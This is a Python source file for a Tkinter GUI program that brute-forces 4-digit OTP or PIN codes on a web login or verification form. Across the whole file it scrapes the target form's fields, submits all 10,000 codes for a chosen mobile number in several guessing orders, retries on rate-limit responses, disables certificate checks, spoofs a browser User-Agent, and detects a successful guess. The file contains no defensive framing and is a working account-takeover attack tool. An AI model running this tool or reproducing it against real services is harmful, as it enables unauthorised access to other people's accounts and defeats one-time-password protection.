import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
import threading
import time
from queue import Queue
import random
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class OTPBruteForceGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("4-Digit OTP Brute Force Tool - Enhanced")
        self.root.geometry("950x750")
        
        self.running = False
        self.attempts = 0
        self.found = False
        self.timeout_count = 0
        self.error_count = 0
        
        # Create session with retry strategy
        self.session = self.create_session()
        
        self.create_widgets()
    
    def create_session(self):
        """Create requests session with retry and timeout configuration"""
        session = requests.Session()
        
        # Retry strategy - fixed for compatibility
        try:
            # Try new parameter name (urllib3 >= 1.26)
            retry_strategy = Retry(
                total=3,
                backoff_factor=1,
                status_forcelist=[429, 500, 502, 503, 504],
                allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
            )
        except TypeError:
            # Fallback to old parameter name (urllib3 < 1.26)
            retry_strategy = Retry(
                total=3,
                backoff_factor=1,
                status_forcelist=[429, 500, 502, 503, 504],
                method_whitelist=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
            )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=10,
            pool_maxsize=20
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Set default headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        return session
    
    def create_widgets(self):
        # Title
        title = tk.Label(self.root, text="🔐 4-Digit OTP/PIN Brute Force Tool (Enhanced)", 
                        font=("Arial", 16, "bold"), fg="#2196F3")
        title.pack(pady=10)
        
        # Configuration Frame
        config_frame = ttk.LabelFrame(self.root, text="Configuration", padding=10)
        config_frame.pack(fill="x", padx=10, pady=5)
        
        # URL
        tk.Label(config_frame, text="Target URL:").grid(row=0, column=0, sticky="w", pady=5)
        self.url_entry = tk.Entry(config_frame, width=60)
        self.url_entry.grid(row=0, column=1, columnspan=2, pady=5)
        self.url_entry.insert(0, "http://localhost:8080/verify")
        
        # Mobile
        tk.Label(config_frame, text="Mobile Number:").grid(row=1, column=0, sticky="w", pady=5)
        self.mobile_entry = tk.Entry(config_frame, width=60)
        self.mobile_entry.grid(row=1, column=1, columnspan=2, pady=5)
        self.mobile_entry.insert(0, "9876543210")
        
        # Mobile Field Name
        tk.Label(config_frame, text="Mobile Field:").grid(row=2, column=0, sticky="w", pady=5)
        self.mobile_field_entry = tk.Entry(config_frame, width=30)
        self.mobile_field_entry.grid(row=2, column=1, pady=5)
        self.mobile_field_entry.insert(0, "mobile")
        
        # OTP Field Name
        tk.Label(config_frame, text="OTP Field:").grid(row=2, column=2, sticky="w", pady=5, padx=10)
        self.otp_field_entry = tk.Entry(config_frame, width=30)
        self.otp_field_entry.grid(row=2, column=3, pady=5)
        self.otp_field_entry.insert(0, "otp")
        
        # Strategy
        tk.Label(config_frame, text="Strategy:").grid(row=3, column=0, sticky="w", pady=5)
        self.strategy_var = tk.StringVar(value="common")
        strategy_combo = ttk.Combobox(config_frame, textvariable=self.strategy_var, 
                                     values=["sequential", "common", "random", "date-based"],
                                     width=28, state="readonly")
        strategy_combo.grid(row=3, column=1, pady=5)
        
        # Delay
        tk.Label(config_frame, text="Delay (s):").grid(row=3, column=2, sticky="w", pady=5, padx=10)
        self.delay_entry = tk.Entry(config_frame, width=30)
        self.delay_entry.grid(row=3, column=3, pady=5)
        self.delay_entry.insert(0, "0.1")
        
        # Timeout settings
        tk.Label(config_frame, text="Request Timeout (s):").grid(row=4, column=0, sticky="w", pady=5)
        self.timeout_entry = tk.Entry(config_frame, width=30)
        self.timeout_entry.grid(row=4, column=1, pady=5)
        self.timeout_entry.insert(0, "10")
        
        # Max retries
        tk.Label(config_frame, text="Max Retries:").grid(row=4, column=2, sticky="w", pady=5, padx=10)
        self.max_retries_entry = tk.Entry(config_frame, width=30)
        self.max_retries_entry.grid(row=4, column=3, pady=5)
        self.max_retries_entry.insert(0, "2")
        
        # Max Attempts
        tk.Label(config_frame, text="Max Attempts:").grid(row=5, column=0, sticky="w", pady=5)
        self.max_attempts_entry = tk.Entry(config_frame, width=30)
        self.max_attempts_entry.grid(row=5, column=1, pady=5)
        self.max_attempts_entry.insert(0, "10000")
        
        # Method
        tk.Label(config_frame, text="Method:").grid(row=5, column=2, sticky="w", pady=5, padx=10)
        self.method_var = tk.StringVar(value="POST")
        method_combo = ttk.Combobox(config_frame, textvariable=self.method_var,
                                   values=["POST", "GET"], width=28, state="readonly")
        method_combo.grid(row=5, column=3, pady=5)
        
        # Buttons Frame
        btn_frame = tk.Frame(self.root)
        btn_frame.pack(pady=10)
        
        self.analyze_btn = tk.Button(btn_frame, text="🔍 Analyze Page", 
                                     command=self.analyze_page, bg="#2196F3", 
                                     fg="white", font=("Arial", 10, "bold"),
                                     width=15)
        self.analyze_btn.pack(side="left", padx=5)
        
        self.start_btn = tk.Button(btn_frame, text="🚀 Start Attack", 
                                   command=self.start_attack, bg="#4CAF50", 
                                   fg="white", font=("Arial", 10, "bold"),
                                   width=15)
        self.start_btn.pack(side="left", padx=5)
        
        self.stop_btn = tk.Button(btn_frame, text="⏹️ Stop Attack", 
                                  command=self.stop_attack, bg="#F44336", 
                                  fg="white", font=("Arial", 10, "bold"),
                                  width=15, state="disabled")
        self.stop_btn.pack(side="left", padx=5)
        
        self.clear_btn = tk.Button(btn_frame, text="🗑️ Clear Log", 
                                   command=self.clear_log, bg="#FF9800", 
                                   fg="white", font=("Arial", 10, "bold"),
                                   width=15)
        self.clear_btn.pack(side="left", padx=5)
        
        # Progress Frame
        progress_frame = ttk.LabelFrame(self.root, text="Progress", padding=10)
        progress_frame.pack(fill="x", padx=10, pady=5)
        
        self.progress_var = tk.StringVar(value="Ready to start")
        self.progress_label = tk.Label(progress_frame, textvariable=self.progress_var,
                                       font=("Arial", 10))
        self.progress_label.pack()
        
        self.progress_bar = ttk.Progressbar(progress_frame, mode='determinate', maximum=10000)
        self.progress_bar.pack(fill="x", pady=5)
        
        # Statistics Frame
        stats_frame = ttk.LabelFrame(self.root, text="Statistics", padding=10)
        stats_frame.pack(fill="x", padx=10, pady=5)
        
        stats_inner = tk.Frame(stats_frame)
        stats_inner.pack()
        
        # Row 1
        tk.Label(stats_inner, text="Attempts:").grid(row=0, column=0, sticky="w")
        self.attempts_var = tk.StringVar(value="0")
        tk.Label(stats_inner, textvariable=self.attempts_var, fg="#2196F3",
                font=("Arial", 10, "bold")).grid(row=0, column=1, padx=20)
        
        tk.Label(stats_inner, text="Current Code:").grid(row=0, column=2, sticky="w")
        self.current_code_var = tk.StringVar(value="----")
        tk.Label(stats_inner, textvariable=self.current_code_var, fg="#FF9800",
                font=("Arial", 10, "bold")).grid(row=0, column=3, padx=20)
        
        tk.Label(stats_inner, text="Status:").grid(row=0, column=4, sticky="w")
        self.status_var = tk.StringVar(value="Idle")
        tk.Label(stats_inner, textvariable=self.status_var, fg="#4CAF50",
                font=("Arial", 10, "bold")).grid(row=0, column=5, padx=20)
        
        # Row 2 - Error stats
        tk.Label(stats_inner, text="Timeouts:").grid(row=1, column=0, sticky="w", pady=5)
        self.timeout_var = tk.StringVar(value="0")
        tk.Label(stats_inner, textvariable=self.timeout_var, fg="#F44336",
                font=("Arial", 10, "bold")).grid(row=1, column=1, padx=20)
        
        tk.Label(stats_inner, text="Errors:").grid(row=1, column=2, sticky="w", pady=5)
        self.error_var = tk.StringVar(value="0")
        tk.Label(stats_inner, textvariable=self.error_var, fg="#F44336",
                font=("Arial", 10, "bold")).grid(row=1, column=3, padx=20)
        
        tk.Label(stats_inner, text="Success Rate:").grid(row=1, column=4, sticky="w", pady=5)
        self.success_rate_var = tk.StringVar(value="0%")
        tk.Label(stats_inner, textvariable=self.success_rate_var, fg="#9C27B0",
                font=("Arial", 10, "bold")).grid(row=1, column=5, padx=20)
        
        # Log Frame
        log_frame = ttk.LabelFrame(self.root, text="Activity Log", padding=10)
        log_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=10, 
                                                  font=("Courier", 9),
                                                  bg="#1e1e1e", fg="#00ff00")
        self.log_text.pack(fill="both", expand=True)
        
        # Result Frame
        result_frame = ttk.LabelFrame(self.root, text="Result", padding=10)
        result_frame.pack(fill="x", padx=10, pady=5)
        
        self.result_var = tk.StringVar(value="No valid code found yet")
        result_label = tk.Label(result_frame, textvariable=self.result_var,
                               font=("Arial", 12, "bold"), fg="#F44336")
        result_label.pack()
    
    def log(self, message, tag=None):
        """Add log message"""
        timestamp = time.strftime('%H:%M:%S')
        log_msg = f"[{timestamp}] {message}\n"
        self.log_text.insert(tk.END, log_msg, tag)
        self.log_text.see(tk.END)
    
    def clear_log(self):
        """Clear log"""
        self.log_text.delete(1.0, tk.END)
        self.log("Log cleared")
    
    def update_success_rate(self):
        """Update success rate"""
        if self.attempts > 0:
            successful = self.attempts - self.timeout_count - self.error_count
            rate = (successful / self.attempts) * 100
            self.success_rate_var.set(f"{rate:.1f}%")
    
    def analyze_page(self):
        """Analyze target page with timeout handling"""
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a URL")
            return
        
        self.log(f"Analyzing page: {url}")
        self.analyze_btn.config(state="disabled")
        
        try:
            timeout = int(self.timeout_entry.get())
        except:
            timeout = 10
        
        try:
            max_retries = int(self.max_retries_entry.get())
        except:
            max_retries = 2
        
        # Try multiple times with increasing timeout
        for attempt in range(max_retries):
            try:
                self.log(f"Attempt {attempt + 1}/{max_retries} - Timeout: {timeout}s")
                
                response = self.session.get(
                    url, 
                    timeout=timeout,
                    verify=False,
                    allow_redirects=True
                )
                
                response.raise_for_status()
                
                soup = BeautifulSoup(response.text, 'html.parser')
                
                forms = soup.find_all('form')
                self.log(f"✅ Successfully connected! Found {len(forms)} form(s)")
                
                for idx, form in enumerate(forms):
                    self.log(f"\n=== Form {idx + 1} ===")
                    self.log(f"Action: {form.get('action', 'N/A')}")
                    self.log(f"Method: {form.get('method', 'POST').upper()}")
                    
                    inputs = form.find_all('input')
                    self.log(f"Input fields ({len(inputs)}):")
                    
                    for inp in inputs:
                        name = inp.get('name', 'unnamed')
                        inp_type = inp.get('type', 'text')
                        placeholder = inp.get('placeholder', '')
                        self.log(f"  • {name} ({inp_type}) - {placeholder}")
                        
                        # Auto-fill if detected
                        if any(x in name.lower() for x in ['mobile', 'phone', 'tel', 'number']):
                            self.mobile_field_entry.delete(0, tk.END)
                            self.mobile_field_entry.insert(0, name)
                            self.log(f"  ✓ Auto-filled mobile field: {name}")
                        
                        if any(x in name.lower() for x in ['otp', 'code', 'pin', 'verify', 'token']):
                            self.otp_field_entry.delete(0, tk.END)
                            self.otp_field_entry.insert(0, name)
                            self.log(f"  ✓ Auto-filled OTP field: {name}")
                
                self.analyze_btn.config(state="normal")
                messagebox.showinfo("Analysis Complete", 
                                  f"Successfully analyzed!\n\nFound {len(forms)} forms.\nCheck log for details.")
                return
                
            except requests.exceptions.Timeout:
                self.log(f"⚠️ Timeout on attempt {attempt + 1}")
                if attempt < max_retries - 1:
                    self.log(f"Retrying with increased timeout...")
                    timeout += 10
                    time.sleep(2)
                else:
                    self.log(f"❌ All attempts failed due to timeout")
                    messagebox.showerror("Timeout Error", 
                                       f"Failed to analyze page after {max_retries} attempts.\n\n"
                                       f"Suggestions:\n"
                                       f"1. Increase timeout value\n"
                                       f"2. Check if URL is accessible\n"
                                       f"3. Try a different network")
                    
            except requests.exceptions.ConnectionError as e:
                self.log(f"❌ Connection Error: {str(e)}")
                messagebox.showerror("Connection Error", 
                                   f"Cannot connect to server.\n\n{str(e)}\n\n"
                                   f"Check if URL is correct and accessible.")
                break
                
            except Exception as e:
                self.log(f"❌ Error: {str(e)}")
                messagebox.showerror("Error", str(e))
                break
        
        self.analyze_btn.config(state="normal")
    
    def generate_codes(self, strategy):
        """Generate codes based on strategy"""
        if strategy == "sequential":
            for i in range(10000):
                yield f"{i:04d}"
        
        elif strategy == "common":
            common = [
                '1234', '0000', '1111', '2222', '3333', '4444', 
                '5555', '6666', '7777', '8888', '9999', '1212',
                '1004', '2000', '4321', '6969', '1122', '1313',
                '8520', '2580', '1230', '0852', '1010', '2468',
                '1357', '9876', '5678', '4567', '3456', '2345',
                '0123', '3210', '7890', '0987', '1011', '1213'
            ]
            
            for code in common:
                yield code
            
            for i in range(10000):
                code = f"{i:04d}"
                if code not in common:
                    yield code
        
        elif strategy == "random":
            codes = [f"{i:04d}" for i in range(10000)]
            random.shuffle(codes)
            for code in codes:
                yield code
        
        elif strategy == "date-based":
            for day in range(1, 32):
                for month in range(1, 13):
                    yield f"{day:02d}{month:02d}"
                    yield f"{month:02d}{day:02d}"
            
            for year in range(1950, 2025):
                yield str(year)[-4:]
            
            generated = set()
            for day in range(1, 32):
                for month in range(1, 13):
                    generated.add(f"{day:02d}{month:02d}")
                    generated.add(f"{month:02d}{day:02d}")
            
            for i in range(10000):
                code = f"{i:04d}"
                if code not in generated:
                    yield code
    
    def try_code(self, code):
        """Try a single code with retry logic"""
        if not self.running:
            return False
        
        self.attempts += 1
        self.attempts_var.set(str(self.attempts))
        self.current_code_var.set(code)
        self.progress_bar['value'] = self.attempts
        
        url = self.url_entry.get().strip()
        mobile = self.mobile_entry.get().strip()
        mobile_field = self.mobile_field_entry.get().strip()
        otp_field = self.otp_field_entry.get().strip()
        method = self.method_var.get()
        
        try:
            delay = float(self.delay_entry.get())
            timeout = int(self.timeout_entry.get())
            max_retries = int(self.max_retries_entry.get())
        except:
            delay = 0.1
            timeout = 10
            max_retries = 2
        
        data = {
            mobile_field: mobile,
            otp_field: code
        }
        
        response = None
        
        # Retry logic
        for retry in range(max_retries):
            try:
                if method == "POST":
                    response = self.session.post(
                        url, 
                        data=data, 
                        timeout=timeout,
                        verify=False,
                        allow_redirects=False
                    )
                else:
                    response = self.session.get(
                        url, 
                        params=data, 
                        timeout=timeout,
                        verify=False,
                        allow_redirects=False
                    )
                
                break
                
            except requests.exceptions.Timeout:
                self.timeout_count += 1
                self.timeout_var.set(str(self.timeout_count))
                
                if retry < max_retries - 1:
                    if self.attempts % 10 == 0:
                        self.log(f"⚠️ Timeout on {code}, retrying ({retry + 1}/{max_retries})...")
                    time.sleep(1)
                else:
                    if self.attempts % 20 == 0:
                        self.log(f"⚠️ Timeout on {code} after {max_retries} attempts, skipping")
                    self.update_success_rate()
                    time.sleep(delay)
                    return False
                    
            except requests.exceptions.ConnectionError:
                self.error_count += 1
                self.error_var.set(str(self.error_count))
                
                if retry < max_retries - 1:
                    self.log(f"⚠️ Connection error on {code}, retrying...")
                    time.sleep(2)
                else:
                    self.log(f"❌ Connection failed after {max_retries} attempts")
                    self.update_success_rate()
                    return False
                    
            except Exception as e:
                self.error_count += 1
                self.error_var.set(str(self.error_count))
                
                if self.attempts % 50 == 0:
                    self.log(f"⚠️ Error on {code}: {str(e)[:50]}")
                self.update_success_rate()
                return False
        
        # Check response for success
        if response is None:
            return False
        
        try:
            success_indicators = [
                'success', 'verified', 'welcome', 'dashboard', 
                'logged in', 'correct', 'valid', 'authenticated',
                'congratulations', 'approved'
            ]
            
            failure_indicators = [
                'invalid', 'incorrect', 'wrong', 'failed', 
                'error', 'denied', 'rejected'
            ]
            
            response_lower = response.text.lower()
            
            has_success = any(ind in response_lower for ind in success_indicators)
            has_failure = any(ind in response_lower for ind in failure_indicators)
            
            if has_success and not has_failure:
                self.found = True
                self.result_var.set(f"✅ FOUND! Valid code: {code}")
                self.log(f"✅✅✅ SUCCESS! Valid OTP code found: {code} ✅✅✅")
                self.log(f"Response Status: {response.status_code}")
                self.log(f"Response snippet: {response.text[:200]}")
                self.status_var.set("Success!")
                messagebox.showinfo("Success!", 
                                  f"Valid OTP code found!\n\nCode: {code}\n\nAttempts: {self.attempts}")
                self.stop_attack()
                return True
            
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if any(x in location.lower() for x in ['success', 'dashboard', 'home', 'profile', 'welcome']):
                    self.found = True
                    self.result_var.set(f"✅ FOUND! Valid code: {code}")
                    self.log(f"✅✅✅ SUCCESS! Valid OTP code found: {code} (Redirect) ✅✅✅")
                    self.status_var.set("Success!")
                    messagebox.showinfo("Success!", 
                                      f"Valid OTP code found!\n\nCode: {code}\nRedirect to: {location}")
                    self.stop_attack()
                    return True
            
            self.update_success_rate()
            
            if self.attempts % 50 == 0:
                self.log(f"Progress: {self.attempts}/10000 - Current: {code} - Timeouts: {self.timeout_count} - Errors: {self.error_count}")
            
            time.sleep(delay)
            return False
            
        except Exception as e:
            if self.attempts % 100 == 0:
                self.log(f"⚠️ Response processing error: {str(e)}")
            return False
    
    def attack_worker(self):
        """Worker thread for attack"""
        strategy = self.strategy_var.get()
        
        try:
            max_attempts = int(self.max_attempts_entry.get())
        except:
            max_attempts = 10000
        
        self.log(f"🚀 Starting attack with '{strategy}' strategy")
        self.log(f"📊 Max attempts: {max_attempts}")
        self.log(f"⏱️ Request timeout: {self.timeout_entry.get()}s")
        self.log(f"🔄 Max retries per request: {self.max_retries_entry.get()}")
        self.status_var.set("Running")
        self.progress_var.set(f"Testing codes using {strategy} strategy...")
        
        start_time = time.time()
        
        for code in self.generate_codes(strategy):
            if not self.running or self.attempts >= max_attempts:
                break
            
            if self.try_code(code):
                break
        
        end_time = time.time()
        duration = end_time - start_time
        
        if not self.found:
            self.log(f"\n❌ Attack completed without finding valid code")
            self.log(f"📊 Total attempts: {self.attempts}")
            self.log(f"⚠️ Timeouts: {self.timeout_count}")
            self.log(f"⚠️ Errors: {self.error_count}")
            self.log(f"⏱️ Duration: {duration:.2f} seconds")
            if duration > 0:
                self.log(f"📈 Average: {self.attempts/duration:.2f} attempts/sec")
            self.status_var.set("Completed")
            self.progress_var.set("Attack completed - No valid code found")
            messagebox.showinfo("Complete", 
                              f"Attack finished.\n\n"
                              f"Attempts: {self.attempts}\n"
                              f"Timeouts: {self.timeout_count}\n"
                              f"Errors: {self.error_count}\n"
                              f"Duration: {duration:.2f}s\n\n"
                              f"No valid code found.")
        else:
            self.log(f"⏱️ Duration: {duration:.2f} seconds")
            self.log(f"🎯 Found in {self.attempts} attempts")
        
        self.stop_attack()
    
    def start_attack(self):
        """Start brute force attack"""
        url = self.url_entry.get().strip()
        mobile = self.mobile_entry.get().strip()
        mobile_field = self.mobile_field_entry.get().strip()
        otp_field = self.otp_field_entry.get().strip()
        
        if not url:
            messagebox.showerror("Error", "Please enter a target URL")
            return
        
        if not mobile:
            messagebox.showerror("Error", "Please enter a mobile number")
            return
        
        if not mobile_field or not otp_field:
            messagebox.showerror("Error", "Please specify mobile and OTP field names")
            return
        
        confirm = messagebox.askyesno("Confirm Attack", 
                                     f"Start brute force attack?\n\n"
                                     f"Target: {url}\n"
                                     f"Mobile: {mobile}\n"
                                     f"Strategy: {self.strategy_var.get()}\n"
                                     f"Timeout: {self.timeout_entry.get()}s\n"
                                     f"Max Retries: {self.max_retries_entry.get()}\n\n"
                                     f"This may take a while and generate many requests.")
        
        if not confirm:
            return
        
        self.running = True
        self.attempts = 0
        self.found = False
        self.timeout_count = 0
        self.error_count = 0
        
        self.timeout_var.set("0")
        self.error_var.set("0")
        self.success_rate_var.set("0%")
        
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.analyze_btn.config(state="disabled")
        
        self.progress_bar['value'] = 0
        self.result_var.set("Attack in progress...")
        
        self.log("\n" + "="*60)
        self.log("🎯 NEW ATTACK STARTED")
        self.log("="*60)
        
        self.session = self.create_session()
        
        thread = threading.Thread(target=self.attack_worker, daemon=True)
        thread.start()
    
    def stop_attack(self):
        """Stop attack"""
        self.running = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.analyze_btn.config(state="normal")
        self.status_var.set("Stopped")
        self.progress_var.set("Attack stopped")
        self.log("⏹️ Attack stopped\n")


def main():
    root = tk.Tk()
    app = OTPBruteForceGUI(root)
    
    root.update_idletasks()
    width = root.winfo_width()
    height = root.winfo_height()
    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)
    root.geometry(f'{width}x{height}+{x}+{y}')
    
    root.mainloop()


if __name__ == '__main__':
    main()